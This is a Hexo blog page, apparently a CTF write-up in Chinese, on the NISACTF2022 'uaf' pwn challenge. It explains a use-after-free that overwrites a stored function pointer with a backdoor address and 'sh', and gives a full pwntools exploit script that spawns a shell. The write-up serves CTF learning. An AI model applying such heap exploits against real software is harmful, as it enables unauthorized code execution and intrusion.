@@ -1,0 +1,331 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>NISACTF2022-uaf-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="相关资源  
+0x1 分析
+PIE未开
+free完没有置空，存在uaf漏洞
+存在后门函数NICO(char* command)，执行system(command);
+page为结构体指针数组  结构体组成：char str[4] 和 void* func (各为32位)
+show(0) 会执行 (p">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="NISACTF2022-uaf-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												NISACTF2022-uaf-wp
+									
+									
+								</h1>
+								
+									<p id="/2023/06/19/NISACTF2022-uaf-wp/" class="leancloud-visitors view"
+										data-flag-title="NISACTF2022-uaf-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/19/NISACTF2022-uaf-wp">相关资源</a>  </p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><ul>
+<li>PIE未开</li>
+<li>free完没有置空，存在uaf漏洞</li>
+<li>存在后门函数<code>NICO(char* command)</code>，执行<code>system(command)</code>;</li>
+<li>page为结构体指针数组  结构体组成：char str[4] 和 void* func (各为32位)</li>
+<li>show(0) 会执行 (page[0]-&gt;func)(page[0]-&gt;str)</li>
+</ul>
+<h2 id="0x2-思路"><a href="#0x2-思路" class="headerlink" title="0x2 思路"></a>0x2 思路</h2><ul>
+<li>create page[0]</li>
+<li>del page[0]</li>
+<li>create page[1] （此时page[0]和page[1]相同，指向相同空间）</li>
+<li>edit page[1] —-&gt;  ‘sh\0\0’+p32(NICO)   (即修改了page[0])</li>
+<li>show(0)</li>
+</ul>
+<h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./bin&quot;</span>, stdin=pty, stdout=pty)</span><br><span class="line"><span class="comment"># proc = remote(&quot;node4.anna.nssctf.cn&quot;, 28035)</span></span><br><span class="line">belf = ELF(<span class="string">&quot;./bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlt</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shw</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edt</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;strings\n&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b create</span></span><br><span class="line"><span class="string">    b del</span></span><br><span class="line"><span class="string">    b show</span></span><br><span class="line"><span class="string">    b edit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(proc, gdbscript=gscript)</span></span><br><span class="line"></span><br><span class="line">NICO_addr = <span class="number">0x08048642</span></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">add()</span><br><span class="line">edt(<span class="number">1</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(NICO_addr))</span><br><span class="line">shw(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/06/19/NISACTF2022-uaf-wp/" class="leancloud-visitors view" data-flag-title="NISACTF2022-uaf-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/06/17/GDOUCTF2023-tea-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-06-19 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pwn-wp/">pwn-wp<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>12</span></a></li> <li><a href="/tags/pwn/">pwn<span>6</span></a></li> <li><a href="/tags/heap/">heap<span>2</span></a></li> <li><a href="/tags/NISACTF2022/">NISACTF2022<span>3</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>7</span></a></li> <li><a href="/tags/uaf/">uaf<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
